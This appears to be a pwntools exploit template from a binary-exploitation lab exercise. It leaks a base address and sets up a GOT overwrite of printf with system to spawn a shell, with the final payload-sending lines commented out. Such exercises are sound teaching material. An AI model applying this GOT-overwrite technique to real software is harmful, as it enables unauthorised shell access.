#!/usr/bin/python3

# Import everything in the pwntools namespace
from pwn import *

addr=0x555555555050

# The target binary is 64-bit.
# While we can explicitly specify the architecture and other things
# in the context settings, we can also absorb them from the file.
context.binary = './exercise-5'

# Create an instance of the process to talk to
io = process(context.binary.path)

# Receive the address of main
main = io.unpack()

# Load up a copy of the ELF so we can look up its GOT and symbol table
elf = context.binary

# Fix up its base address.  This automatically updates all of the symbols.
elf.address = main - elf.symbols['main']

# # We want to overwrite the pointer for "read"
where = elf.got['printf']
#
# # We want to overwrite it with the address of the function that gives us a shell
what = elf.symbols['system']
#
# # If we really wanted to, we could even find the address of "/bin/sh" in memory
# binsh = elf.search("/bin/sh\x00").next()

print("Main: 0x%016x" % main)
print("Address: 0x%016x" % elf.address)
print("Where: 0x%016x" % where)
print("What: 0x%016x" % what)
#
# # Send the payload
# io.pack(where)
# io.pack(what)
#
# # Enjoy the shell
# io.interactive()
